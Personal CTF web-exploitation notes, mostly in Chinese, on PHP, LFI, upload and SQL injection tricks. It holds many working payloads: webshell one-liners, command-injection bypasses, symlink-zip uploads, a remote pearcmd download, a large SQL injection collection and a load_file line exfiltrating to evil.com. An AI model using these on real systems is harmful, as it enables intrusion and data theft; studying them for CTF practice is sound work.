[php代码审计总结](https://mp.weixin.qq.com/s/Hlk5lXwbaDTmfxOLbFIATg)

bp 试一下scan
       if(!preg_match("/php|file|\:|base|rot/i",$c)){
file,base,rot

sql, xpath报错只能显示32位。用left, mid right截取显示剩余部分


[TOC]
# 解题思路

信息搜集:bypass, 命令执行漏洞
文件路径加.bak 如 /upload.php 访问 /upload.php.bak看有没有源码

注意文件上传马尽量UTF8编码

8. 手动闭合字符串插入内容，再拼接，见dasctf 迷路的魔法少女。

## LFI - Local File Include
1. %00 截断问题 CVE-2020-7066
2. 目录穿越 /../../../../../../../../etc/passwd
3. 伪协议 ?url=php://input  , 在最下面位置 `<?php system('ls');?>`
2. includes/class_<input>.php => includes/class_aaa/../../../../info
3. str_replace('../', '')   双写POC:  ..././ -> ../
4. 查看html隐藏字段提交
5. 查看 robots.txt, hint.txt, index.php, flag.php, index.php~, index.php.swp, 当前页 php
6. 二次编码,例 `"admin"!==x && urlencode(x) == 'admin'` , 二次encode x
7. filename  提示目录穿越
7. file 提示为伪协议
8. 远程文件包含

## 上传文件
### ln 文件链接
1.python| zip文件 | 上传passwd的link `BUUCTF：[HCTF 2018]Hide and seek` https://blog.csdn.net/mochu7777777/article/details/105190181/
```
ln -s /etc/passwd link1
zip -y link1.zip link1
```
2. 深育杯zipzip

```
mkdir 111
cd 111
/111# ln -s /var/www/html file1
/111# zip --symlinks 1.zip file1

/111# mkdir aaa
/111# cd aaa
/111/aaa# mkdir file1
/111/aaa# cd file1
/111/aaa/file1# echo '<?php eval($_GET[1]);?>' > 1.php
/111/aaa/file1# cd ..
/111/aaa# zip -r 2.zip ./*
```
将1.zip和2.zip依次上传，即可将1.php映射到/var/www/html目录下

先将一个软连接解压到/tmp/uploads/ 然后建立一个相同软连接的名字的目录里面写shell

然后在上传zip。

那么会解压的时候 相对路径是 xxx/1.php 而xxx 已经在/tmp/uploads 并且指向了/var/www/html/

那么最终解压的路径就会变成 /var/www/html/1.php

### xxe

## php 相关

   1. .hg源码泄漏 .git源码泄漏 .DS_Store文件泄漏，还有以.phps .bak结尾的网页
   2. 弱类型 "1b" == 1
   3. 空数组, sha1加密相同
   4. data://text/plain  传输内容, ?text=data://text/plain,I have a dream
   4. php://input        传输内容, ?text=php://input 改为POST请求, 在body传 I have a dream
   4. 获取文件内容 php://filter/ , ?file=php://filter/convert.base64-encode/resource=next.php
                                 file=php://filter/string.rot13/resource=include.php
                                 有时要把尾部的php去掉

   5. 目录扫描+文件上传
   5. 文件上传
      
       6. .user.ini 绕过
       7. 脚本语言绕过 `<script language='php'> phpinfo();</script>`
   6. %00截断 <5.3
   6. 需要查看点: phpinfo()
   6. 参数测试 ?no=1, 添加`'`, ?no=1' 测试
   7. $_SESSION -- `$password==$_SESSION['password']`, 抓包把PHPSESSID置空传password= 空即可
                    session.upload_progress.cleanup 文件包含，见下面
   6. phar反序列化漏洞
   7. PHP通过文件名注入。
   7. PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量 即 `<?=@eval($_POST['a']);?>`
   7. 条件竞争  --- CTFshow红包题第六弹
   8. require_once绕过
                 1. session.upload_progress.cleanup 竞争
                 2. ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
      
   7. 执行漏洞

       assert 字符串参数当作php参数执行。 assert("phpinfo()"), 下面有详解
       preg_replace() php5.5 /e 代码执行漏洞, 与双引号执行
       create_function  见_writeup_web.md
              https://www.gem-love.com/ctf/770.html
       call_user_func
       call_user_func_array
       `反引号执行
        
        8. 代码审记
       
       wget 反弹shell

   8. 查看rce章节
   11. [escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php#99213) 绕过, 使用非ascii字符比如 fl%7gag 绕flag
   12. 未过滤?和/   ?shell=/???/????64 /????????  -> /bin/base64 /flag.txt   , 同ctfshow web55
   13. session文件包含  web_php_session_include.py
   13. 日志包含 ?c=/var/log/nginx/access.log, 如果包含user-agent请求头,写入一句话木马
          蚁剑连接/var/log/nginx/access.log
   
   14. ssrf 看有没url, returl,   returl=https://www.baidu.com , 看有没返回值。
   14. ?c=pearcmd&+download+http://xx.yy/1.php           https://blog.csdn.net/qq_46091464/article/details/108954166

## ruby

res = open(file, 'r').read()   open()函数来打开可控制 file 参数传入的文件名。而 ruby 中的 open()函数是借用系统命令来打开文件，且没用过滤 shell 字符，导致在用户控制文件名的情况下，将可以注入任意命令。

`file=|whoami > test.png`

## nodejs/javascript

`setTimeout` 当 delay 大于 2147483647 或小于 1 时，则 delay 将会被设置为 1。非整数的 delay 会被截断为整数。

javascript 反混淆 https://lelinhtinh.github.io/de4js/
## linux知识
proc见 Web_php_NSSCTF.md - # NSSCTF prize2 - nodejs 文件描述符

/proc/pid/fd 里有所有打开的file descriptor信息

/proc/self/cmdline
/proc/self/environ
wsgi.ini

读取mac地址 /sys/class/net/eth0/address

见 writeup/Web_php_NSSCTF.md#NSSCTF prize2 - nodejs 文件描述符

### 网卡地址
uuid.getnode() 为网卡地址去掉:
```
ifconfig -a
1. ifconfig-a其中 HWaddr字段就是mac地址 
2. cat/sys/class/net/eth0/address  查看etho的mac地址 
3.cat /proc/net/arp 查看连接到本机的远端ip的mac地址
4.程序中使用 SIOCGIFHWADDR的oct命令获取mac地址N@ Tasso}

```

## python - ssti
ssti注入 Twig: {{7*'7'}} 输出49  [BJDCTF2020]Cookie is so stable https://www.cnblogs.com/wkzb/p/12422190.html
        Jinja2 {{7*'7'}} 输出'7777777'
        python/flask/django

                只给hello guest, 试试 ?name=123, ?name={{config}}, 可能是jwt要伪造admin
                h.encode('idna').decode('utf-8') 绕过 见 -- [SUCTF 2019]Pythonginx

12.java类/Apache/jsp 见下面

11. shtml, Apache SSI 远程命令执行漏洞 `[BJDCTF2020]EasySearch`
5. xxe 漏洞 获取文件,比如API请求的题

8. sql
   
    1. union注入的使用
    1. 0x1 SQL 整数型注入
    1. 0x2 SQL 字符串型注入
    1. 0x3 SQL 报错注入
    1. 堆叠注入 `1;show databases;`,`1;show tables;`, `*,1`

    2. 实例 [SWPU2019]Web1 bypass informations
    3. 读取文件 [LOAD_FILE](#sql_load_file)

## 其他

1. 看源码， 查找password, key ,flag
2. 看控制台 提示。
2. burpsuite看request 练习:`[BJDCTF 2nd]假猪套天下第一`
2. burpsuite看request - 有无 admin
2. burpsuite看request - 有无 flag
2. burpsuite看resopnse
2. burpsuite看History的response, 网页源码看不到, /POST的时候 会有变化。或者发到repeater手动提交看看。
3. 寻找信息 401.html 402.html 403.html 404.html
8. .git泄露
7. 扫描网站 扫后结果里先搜索.zip
7. 扫描网站
   
      1. register.php
      2. www.zip
      3. index.php.bak
2. 如果提供了文件，可以百度下文件名， 可能有信息
3. 使用 file_get_contents 获取 index.php 看源码。
3. 提示money要100000可以使用money[]=100000
3. 以指定端口访问  curl web.jarvisoj.com:32770 --local-port 51
4. 要求本地登录, locally, bp抓包，在上方添加,  
        1. X-Forwarded-For: 127.0.0.1
        2. client-ip: 127.0.0.1
        2. Referer: http://127.0.0.1
5. 要求来自https://www.google.com -- bp抓包在上方添加, Referer:https://www.google.com
6. 要求email:   `From: root@gem-love.com`
7. 要求代理服务器/proxy:  `Via: y1ng.vip`
5. 要求管理员登录 请求时添加 admin=1, isadmin=1
6. ip 地址相关 X-Forwarded-For, 可能有模板注入, SSTI,smarty
   
    SSTI可使用 tplmap 检查
6. 未使用waf过滤时,比如ping输入框 , 见网鼎杯nmap

        127.0.0.1 && find / -name "*.txt"
        -c 3 -c 1 127.0.0.1 && cat /home/flag.txt

6. sql md5 加密注入

8. 过waf

    1. var_dump(scandir(/))
    2. 序列化
    3. 特殊字符绕过使用 <>，*，select，%，反引号，||，&, \
    3. `preg_match('/^[a-z0-9_]*$/isD',$act)` 绕过使用?act=\create_function&arg=){}system("ls");//
    4. 绕过 wakeup 见后面
    5. 绕过 php关键字 --- <?php 换成 <?= @eval($_POST["pd"]);?> -oG pd.phtml '
    6. 绕过 后缀黑名单 phtml .phps .php5 .pht, 见后面对apache设置
    6. 命令行注入escapeshellarg, escapeshellcmd,  `?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '`
    6. 命令行注入escapeshellarg, escapeshellcmd,  `?host=' <?php echo `cat /flag`;?> -oG test.php '`
    7.  [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)




11. xxe/xml实体注入 `[NCTF2019]True XML cookbook`

12. 常见读取文件

```
    /etc/passwd
    /etc/hosts
    /proc/net/arp     ,通过这里得到IP段，爆破
    .bash_history
```
11. 网站备份  index.php, index.php.bak, index.php~, .git/
12. GET请求改POST请求
12. Java项目 WEB-INF/web.xml
13. vim临时文件 swp swo : `vim -r ff.swp` `cat ff.swp`

## bypass绕过方式

    2. bypass informations:
```
    1.大小写绕过
    fuzz_list-regexbuddy测: 
        mysql -- 见sql_fuzz.json --  /**/,sElect,uNion,(),	,oR,aNd,bEtween,like,regexp, ,",',^,+,Hex,0b1111101000,?,sHow,dEsc,orDer By,--,~~,`,CONcat,aLter,Columns,*,UpdateXml,ExtractValue,load_file,//,sUbstr,mId,=,mId,lIke,iNto,fIle,iF,sLeep,bEnchmark,lEft,rIght,^,&,||,>,<,#,-,aScii,oRd,sT_,fLoor,gEomfromtext,x(,pOw,cAse,rPad,rEpeat,jOin,bUffer,iNcrement,iNfo,sYs,lImit,oRder,bY,iNsert,uPdate,dElete,iNform
                                     dAtabases,tAbles,uSer,0x,cHar
                                     mysql.innodb_index_stats,mysql.innodb_table_stats,sys.schema_auto_increment_columns
                                     DESC `table name`
                                     SHOW COLUMNS FROM `table name`

                 -- 绕过空格  %09 => tab , ()
                 -- 绕过`     --用别名   select b from (select 1,2,3 as b union select * from admin)a;
                 MySQL 遇到 hex 会自动转成字符串 , 0x61 即 a
                 只能是数字: '0' + 使用2次hex + '0'        -- 网鼎杯 2018 unfinish/ctfshow内部赛签到
                 password在字段名  有password，passwd，pwd -- 见writeup MySQL查询的按位比较 
                 猜 列为flag, 表为flag , select flag from flag
                 看: 常见的SQL注入考点 CTF-123458
                 mysql8 (https://mp.weixin.qq.com/s/U65QGzQoR1EY0QFaTy5--g) , table命令

        php函数-- print_r(glob("*"))|
                 highlight_file|show_source|readfile|file_get_contents -- file_get_contents需要echo
                 exec|shell_exec|system|^|~|`|passthru|proc_open|phpinfo|popen|dl|eval|proc_terminate|touch|escapeshellcmd|escapeshellarg|assert|substr_replace|call_user_func_array|call_user_func|array_filter|array_walk|array_map|registregister_shutdown_function|register_tick_function|filter_var|filter_var_array|uasort|uksort|array_reduce|array_walk|array_walk_recursive|pcntl_exec|fopen|fwrite|file_put_contents|unserialize
                 iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\.|index|function|zlib|strip_tags
                 windows下 type flag.php
                 Linux      cat flag.php
                 输出 print_r, vardump(array), 把array 转字符串
                 preg_match() 在匹配一次后停止搜索。
                 preg_match 可以用数组绕过见 NSSCTF prize_p1 脚本2
                 str_replace(ar1, ar2, "he") , 可用数组绕过, 1对1替换。见 ### str_replace
                 exec 函数可以同时执行多个命令 , 只需要用 \n 分隔即可

                 未过滤()取反绕过 $arg = "};(~(" . ~'system' . ")) (~(" . ~'cat Tru3flag.php' . "));//";
                 -- ctfshow 红包题第二弹（无数字字母RCE） -- 见下面
                    .表示 source
                    <?=是echo()的别名用法, 先用?>闭合一下，即?><?=`ls`;
                 -- ### [无字母数字webshell之提高篇  ?c=.+/???/????????[@-[]        //[@-[]表示A-Z之间
                 -- 用异或绕
                    eval("("%0b%08%0b%09%0e%06%0f"^"%7b%60%7b%60%60%60%60")();")     -- ("phpinfo")();
                 -- 二次编码绕过  php://base64 => php://bas%256564, 二次编码e => %2565
                 -- base_convert(696468,10,36);  => exec, 超过10会使用字母 - 见_writeup_web: love math
                 -- 动态函数 $function = "sayHello";$function();
                 -- exec+getheaders绕过, 见Love math
                 -- strlen($_GET[1])<4 见 nl/od -- ctfshow 【nl】难了
                 -- strlen(数组) == null, 可绕很多
                 -- ### 过滤空格
                 -- ### 文件读取
                 -- ### 黑名单绕过
                 -- ### 绕过escapeshellcmd
                 -- ### basename 绕过 - php会把.和[解析成_，php特性
                 -- ### 无写入权限 - 见## 没有写入权限
                 -- ### 死亡die/exit绕过 

        Linux -- /dir/ls|bash|tac|nl|more|less|head|base64|wget|curl|tail|vi|cat|tee|od|grep|sed|bzmore|bzless|pcre|paste|python|diff|file|echo|touch|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i
              绕过技巧:  base64-- echo "bHMgLWxoYSAv"|base64 -d|bash > test.png
              写入文件: dir |tee 1.txt
              新建文件: touch 1.txt


        php绕过技巧 $a='sys';$b='tem';$d=$a.$b;$d('cat config.php');
                   ca""t
                   base64|$a = base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);
                   assert闭合|assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?>|
                   POST传参|?c=echo `$_POST[1]`?>|然后POST中-- 1=cat config.php
                   POST传参|?c=echo `$_POST[1]`;|然后POST中-- 1=cat config.php
                   通配符?和数字没有过滤 -- preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c))
                         ?c=bin/base64 flag.php => ?c=/???/????64 ????????

        linux命令 nl|od
 

    16进制 0x38e
    异或 200^800
        id=1000 -- preg_match("/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i",$id)  --> id=144^888

    按位与 992|8
    加减乘除都可以 --1000  负负得正
    ~~1000 == 1000


    空格 => /**/
    order by => group by
    测试列数 select * from ads where title = '$title' limit 0,1; 闭合替换$title
        $title ====> -1'/**/group/**/by/**/22,'1
        替换后: select * from ads where title = '-1'/**/group/**/by/**/22,'1' limit 0,1;
    显示看是哪一列 -1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
    取反码 preg_match("/[A-Za-z0-9]+/",$code)

    bypass select -- updatexml，用extractvalue
```
### bypass-sql

```sql
by pass 空格 -- /**/|tab|
by pass ,
        1.将limit 0,1样式改为limit 1 offset 0。
        2.将substr(string,1,1)改为substr(string from 1 for 1)。
        SELECT SUBSTR('abc' from 1 for 1) # == SELECT SUBSTR('abc', 1,1)  # 'a'
        select substr((select group_concat(table_name) from information_schema.tables where table_schema=database())from 1 for 1)
by pass password ='".md5($password,true)."'";
        只要md5加密后的16进制转化为二进制时有 'or’xxxx，即可构成闭合语句： username ='admin' and password =' 'or 'xxxxx' 成功登陆
        两个答案
        1.ffifdyop  #转换后为 b"'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c"
        2.129581926211651571912466741651878684928
by pass  /select|update|delete|drop|insert|where|\./i   堆叠注入-强网杯随便注
    show, 
    -1';show tables#
    -1';show columns from `1919810931114514`#
    -1';desc `1919810931114514`#       -- 显示列名
    -1';desc `words`#
    方式1.预编译
    -1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#


    方式2.修改表名
    --原sql为 select * from words where id = ''; 修改为word表即可查
    1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
by pass strlen($username)!=strlen(replaceSpecialChar($username))+双写+$password==$row['password']
        "/(select|from|where|join|sleep|and|\s|union|,)/i";
        -- ctfshow_web10
        payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&password=

        rollup 介绍--with rollup是用来在分组统计数据的基础上再进行统计汇总，即用来得到group by的汇总信息
                   select `password`,count(*) from user GROUP BY `password`
                   select `password`,count(*) from user GROUP BY `password` with ROLLUP
    堆叠注入-[suctf 2019]EasySQL
        sql=“select”.post[‘query’]."||flag from Flag";  -- 输入 *,1
        select *,1||flag from Flag  =>
        select *,1 from Flag
by pass '单引号  [CISCN2019 总决赛 Day2 Web1]Easyweb,网鼎杯2018 comment
by pass =,()
        使用 like ,rlike, regexp
by pass 技术 16进制
        select * from users where user= 0x31; -- user=1; 数据位置能用16进制
by pass 路径, 使用 UNC路径-windows特有
        select load_file(concat('\\\\', (select hex(database())), '.evil.com)) 相当于访问 \\ctfer.vip\test, 会有http/tcp请求，
```
信息收集
```sql
SELECT @@datadir -- 数据库存储路径, /var/lib/mysql/
SELECT @@basedir -- mysql安装路径, /usr
```
## 学习参考链接 Wiki

[CTF中Web题目的常见题型及解题姿势](https://mp.weixin.qq.com/s/b3NJgwh9_fR4BW-hKc0idA)

[渗透测试中如何快速拿到Webshell](https://mp.weixin.qq.com/s/4o3IRc_vC9jSW12Sf-6taA)

[CTF web 题型解题技巧-第一课 思路讲解](https://mp.weixin.qq.com/s/QGjP8mHz3ZYVlgQqEGawjw)

[CTF web 题型理论基础篇-第二课 理论基础](https://mp.weixin.qq.com/s/aJg-qVl9ZAZ3b2UfW2uL1Q)

[CTF web 题型流量分析-第三课 （ctf 之流量分析） 工具使用-流量分析](https://mp.weixin.qq.com/s/LVGBp9rzjGoQ-4zwJvDFLQ)

[CTF web 题型解题技巧-第四课 web总结](https://mp.weixin.qq.com/s/Yc2bZmVPO-akMCLKxfdAwQ)

[CTF web 题型总结 第五课-- CTF WEB 实战练习（一）](https://mp.weixin.qq.com/s/-xOlhBiOZF1FIvRXqH8eHQ)

[CTF web题型总结-第六课 CTF WEB实战练习(二)](https://mp.weixin.qq.com/s/Smz8azjp7F5oeyQkz5YM8w)

[CTF web题型总结-第七课 CTF WEB实战练习(三)](https://mp.weixin.qq.com/s/y9sbf1VV-JCtSQGYxTHdxw)

[SQL注入基础整理及Tricks总结](https://www.anquanke.com/post/id/205376)  [Link2](https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg)

[闲谈Webshell实战应用](https://mp.weixin.qq.com/s/xKB64su2gJJ51ZKEF0PSKg)

[Getshell | 文件上传绕过整理](https://mp.weixin.qq.com/s/DpZyReQenYwg-5F_tx2u8A)

## php解题思路
1. 构建shell，看phpinfo

```php
    @$this->x()['Ginkgo'];
    $this->decode = @base64_decode( $this->code );
```
比如这样的构建 `eval($_POST['a']);` 转base64 => ?Ginkgo=ZXZhbCgkX1BPU1RbJ2EnXSk7 ,用蚁剑连这个地址。

构建 `a=phpinfo();` ，用hackbar post出去 `a=phpinfo();` 注意分号。

2. 绕过读取文件
   

[exp.php](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)

修改一行 `pwn("/readflag");`

## 过waf等过滤
添加空格绕过，如[Web-[RoarCTF 2019]Easy Calc](https://www.cnblogs.com/gaonuoqi/p/11890094.html),限制了num，waf并没有限制'  num'，当php解析的时候，又会把'   num'前面的空格去掉在解析，利用这点来上传非法字符

    ? num=1;var_dump(scandir(chr(47))) // scandir(/)
    ? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) # flagg

1. \指命名空间, 有的版本可用。Linux下可以添加 \ 来过, 比如 \system = system, ca\t = cat
```
POST
http://d0ee41d4-e9af-43bb-99e7-e3adcf19757d.node3.buuoj.cn/index.php?func=\system&p=find / -name flag*
```

2. 先序列化 echo serialize($a), 然后提交反序列化的内容

``` php
<?php
class Test {
    var $p = 'ls /';
    var $func = 'system';
}
$a = new Test;
echo serialize($a);
?>
// O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
// 比如func和p, 提交 func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
```


## 查找flag的命令

`cat /*/flag; cat/*/*/flag; cat/*/*/*/flag`

`grep -r flag /`

## 没有写入权限 / file_put_contents / gopherus
phpinfo要能看到 ftp、php-fpm组件才可以用FTP打。
[如何用 FTP 被动模式打穿内网](https://mp.weixin.qq.com/s/J5FJdg294aBxchfkrCA5Lw)

`_writeup_Web.md`
```
# 2021陇原战疫
## eaaasyphp
```
## 死亡die/exit绕过 

死亡die/exit绕过 
https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md
https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/

# 工具/环境准备
Firefox + 插件 proxy, hackbar

Chrome + 插件 proxyomega + hackbar

    点击 Load URL, √Post data, 修改对应的字段
    点击 Execute

扫描工具
    
    wscan，ctf-wscan dirsearch之类的
        dirsearch: python dirsearch.py -u "http://node3.buuoj.cn/" -e * -s 1 --proxy=http://proxy2.dq.petrochina:8080 
        dirsearch: python dirsearch.py -u "http://node3.buuoj.cn/" -e php,asp,aspx,do,jsp -s 1 --proxy=http://proxy2.dq.petrochina:8080 
    nikto -h 10.1.1.147 -p 5002


[WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet#python)

# Sql

## 测试
post请求用#, GET请求用 %23
```
id=1%23                             | 普通注入
id=1'%23                             | 普通注入
id='1'%23                             | 普通注入
id=1''%23                             | 普通注入
id=1"%23                             | 普通注入
id=1""%23                             | 普通注入
id=1')%23                             | 普通注入
id=1'))%23                             | 普通注入
id=1")%23                             | 普通注入
id=1"))%23                             | 普通注入
id='%df\'#'                             | 宽字节注入
id=1'or/**/1/**/like/**/1#                             | 普通注入
     rlike/regexp                             | 普通注入
username=admin\&password=||1=1#                             | 普通注入
id=1 and DATABASE() regexp 0x742E2B
id=0 or id BETWEEN 1 and 5; 等价于 [a,b]
id=CHAR(97, 100, 109, 105, 110)

无列名注入
select 1,(select group_concat(b) from (select 1,2,3 as b union select*from users)b)
select 1,(select group_concat(b) from (select DISTINCT table_name as b from mysql.innodb_index_stats WHERE DATAbase_name=DATABASE())b)
1   and (select group_concat(`2`)   from    (select 1,2 union   select  *   from    {table_name})a) regexp  {{}}
```

## 常见的SQL注入考点 CTF-123458

```
    1.联合查询: union select group_concat(username,0x7e,password),2,3 from...，order by...
    2.布尔盲注: if(ascii(substr(database(),1,1))>100,1,0)
               不用闭合
               SELECT password from user WHERE id = ${id}
                      ${id} = if(ascii(substr((select flag from flag),{},1))>{},1,2)
    3.时间盲注: if(ascii(substr(database(),1,1))>100,sleep(5),1)
    4.报错注入: (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 大整数报错等
                'or updatexml(1,concat(0x7e,user()),1)#
                'or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#
                'or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag_head')),1),1)#
                'or updatexml(1,concat(0x7e,(select group_concat(flag_h1) from flag_head)),1),1)#
                --- 见 web_sql_00normal_04_error_inject.py
                (1). 通过floor报错 能显示64字符, test1名称里会多出1，去掉改为test
                (2). 通过updatexml报错 32字符 只有在payload返回的不是xml格式才会生效
                (3). 通过ExtractValue报错
                ?username=admin'or(extractvalue(1,concat(0x7e,user(),0x7e)))%23&password=21

    5.堆叠注入: select * from users where id= 1;create table test like users;
    6.二次注入:通过在一处输入点构造sql语句，在第二处触发
               -- 1.登陆:邮箱。密码 2.登陆后:限制用户名,显示用户名 -- 可能二次注入 -- 网鼎杯2018unfinish
    7.宽字节注入:通过数据库编码错误来绕过字符转义
                sql = 'select *from user where id=\''.$id.'\'';
                GBK两个字符为一个汉字, 输入宽字符%df使反斜杠和这个%df形成一个汉字
                GET方式 id=1%df' union select 1,database(),3%23
                POST方式-没有url解码 username=1汉') or 1=1#
                        -配合盲注完成
    8.WAF绕过:绕过过滤字符达到sql注入效果
    9.sql注入读写文件:通过sql注入写入webshell,或直接读取服务器文件
    10.sql注入提权:通过sql注 入获取服务器权限
    - 读取数据 见0x10
    - 绕过字符  /**/替换空格, 用<a>无意义填充过waf , 看bypass
    load_file
    head 注入 useragent进行报错注入
    MySQL查询的按位比较 -- CTFshow web1, [GYCTF2020]Ezsqli

    SQLi-Quine  $row['password'] === $password, 输入的password值等于查询出来的值
                http://y24.top/go?_=06d458b6b3aHR0cHM6Ly93d3cuc2h5c2VjdXJpdHkuY29tL3Bvc3QvMjAxNDA3MDUtU1FMaS1RdWluZQ%3D%3D
                https://www.shysecurity.com/post/20140705-SQLi-Quine
                'UNION/**/SELECT/**/REPLACE(REPLACE('"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#',CHAR(34),CHAR(39)),CHAR(37),'"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#')/**/AS/**/a#

```

转义+rlike/regexp模糊匹配 id=admin\
```
# https://www.bilibili.com/video/BV1ZT4y1o7H8  --1:10:31
"SELECT * FROM user WHERE username ='" .$username. "' AND password = '" .$password. "'"
username=admin\&password=||1=1#
# 关于 "||"
0||1=1, 0||0=0
# rlike(或者reexp)
模糊匹配,可以与正则匹配模式一起使用.如果未指定^xxxx$只要模式在指定字符串中就可以被匹配到
注意: SQL模糊匹配是不区分大小写的, 需要另外写爆破大小写脚本。
name= 'safasfascyxqagasgasfasfas'
name rlike cyxq
username=admin\&password=||(password)rlike(0x{})#
```

综合分析

|               Column               |               测试1                |               测试2                |
| ---------------------------------- | ---------------------------------- | ---------------------------------- |
|              ?id=1''               |              ?id='1'               |                                    |
|                $id                 |                1''                 |                '1'                 |
|              $id结果               |                正常                |                正常                |
|               '$id'                |               '1'''                |               ''1''                |
|             '$id'结果              |                正常                |                错误                |


1. 在用户名或密码处加引号测试

        http://[极客大挑战 2019]EasySQL/check.php?username=admin'&password=11
        报错 猜测  select * from users where name='$username' and passwd='$password';

PHP 优先级从高到低是：&&、||、and、or。

        $a || $b and $c || $d
        //相当于
        ($a || $b) and ($c || $d)

构造 username=admin or 1=1 和 passwd=admin or 1=1即可

        payload：?username=admin' or '1'='1&password=123' or '1'='1
        替换后:   name='admin' or '1'='1' and passwd='123' or '1'='1';

其他万能密码, 有时不能为空（过滤了空字符）

    1' or 1=1 #
    uname=1' or 1=1 #&passwd=any
    uname=1' or '1=1'#&passwd=any
    select * from user where uname = '222' and upass = '222' 
    select * from user where uname = '222' and upass = '222' or 1=1
    select * from user where uname = '222' and upass = '222' or '1=1#'
    select * from user where uname = '222' and upass = '222' or '1'='1'

过滤空格, 用/**/代替
    
    先输入1，再输入1'，页面报语法错误，再输入1 '页面出现SQLi detected!，推出空格被它过滤了
    '/**/or/**/id=4/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/'1'='1

```
/*!union*/ 绕过union过滤
```

fuzz后能用 
```python
"0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
# '0^(ascii(substr((select(flag)from(flag)),1,1))>94)'
```
## 基础介绍

### 如何判断注入点
GET请求不要用#, 用%23代替
POST请求要用#

1.数字型: id=1 and 1=2，id= 3-2; id=0!=1 ，id=1 in(1,2)..   # 3-2返回结果是1的数据
    可用符号: +,-,*,/,<,>,<=,=>,!等
    关键字: like， and，or， in ，between等
    语句通常为: SELECT 列FROM表WHERE数字型列=值
2.字符型: id= 1' and '1'='2， id=1'!=1 %23， id=1'!=1--+...      # %20或+ 表示空格, url编码 即 --+ -> --空格
    可用符号与关键字与数字型相同，区别在于需要将引号闭合
    语句通常为: SELECT 列FROM表WHERE字符型列='值  ’
    id='1'
    id='1' union select 1,2,'3'
          payload: 1' union select 1,2,'3
3.搜索型: id =1%' and 1=1--+...
    区别在于搜索类型常使用%，需要从返回结果中判断
    语句通常为: SELECT * FROM表WHERE where被搜索的列like ' %值%'

常见问题
只能 from table_name 不能  from 'tname', "tname"

## 常见方式
### 双写绕过 admin' oorr '1'='1

    admin' oorr '1'='1
### 0x1 SQL 整数型注入 2341 union select database(),2
https://blog.csdn.net/weixin_44732566/article/details/104340658

默认sql: select * form news where id=?

0.查数据库

payload:`2343 union select database(),2`

    返回sqli
    id=2343在数据库中是不存在的，所有返回NULL，因为前端页面只有ID，Data两处地方可以回显数据
    这样union select查询的数据就可以回显了

#### information_schema三步

1.查表名

    select * from news where id=2343 union select group_concat(table_name),3 from information_schema.tables where table_schema='sqli'
    返回flag

2.查字段名
    
    select * from news where id=2343 union select group_concat(column_name),3 from information_schema.columns where table_name='flag'
    返回字段flag

3.查数据

    select * from news where id=2343 union select flag,3 from sqli
    select * from news where id=2343 union select group_concat(flag),3 from sqli
    返回目标值

一、常用函数

    1、database()：当前网站使用的数据库
    2、version()：当前MySQL版本
    3、user()：当前MySQL的用户

二、MySQL默认有“information_schema”的数据库，该库中有三个表名：

    1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。
    2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。
    3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。

### union注入: -1 union select database(),2;
三、union注入

    # 是行注释
    union操作符将两个SQL查询语句连接了起来，当设置id参数为-1时，由于没有id=-1的数据，因此会返回union后的查询语句的结果。
    
    select * from line_tour where id=-1 union select database(),2;
        select database(),2 是两列，前面的结果也要是二两列能返回结果
    
    select * from line_tour where id=-1 union select database(),2,3,4,5,6,7;

